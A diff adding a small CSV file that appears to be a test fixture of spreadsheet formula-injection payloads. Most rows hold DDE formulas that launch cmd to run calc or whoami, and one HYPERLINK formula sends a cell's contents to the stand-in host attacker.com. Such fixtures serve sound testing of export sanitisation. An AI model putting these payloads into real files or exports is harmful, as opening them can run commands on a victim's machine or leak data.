@@ -1,0 +1,7 @@
+Name,Email,Message
+=cmd|' /C calc'!A0,test@test.com,hello
+=HYPERLINK("http://attacker.com/?x="&A1,"click")
++cmd|' /C whoami'!A0,test@test.com,hello
+-2+3+cmd|' /C whoami'!A0
+@SUM(1+1)*cmd|' /C whoami'!A0
+=1+1
